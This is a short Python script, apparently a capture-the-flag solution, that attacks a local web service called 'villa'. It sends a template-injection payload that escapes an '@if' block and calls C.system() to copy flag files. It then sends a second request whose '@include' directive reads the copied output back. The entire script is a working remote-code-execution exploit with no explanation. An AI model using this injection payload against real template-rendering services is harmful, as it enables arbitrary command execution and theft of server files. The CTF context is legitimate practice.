import requests 
from threading import Thread
import time 

url = "http://localhost:17171/villa"

r = requests.post(
    f"{url}", 
    data="@if true { }; cmd := 'cat /tmp/villa/flag.*.txt > /tmp/villa/test.txt'; unsafe { C.system(&char(cmd.str)); } if true\n@end",
)
if r.status_code == 200:
    print(r.status_code)
    print(r.text)   

time.sleep(5)

r = requests.post(
    f"{url}", 
    data="@include 'test.txt'",
    allow_redirects=False
)
if r.status_code == 200:
    print(r.status_code)
    print(r.text)       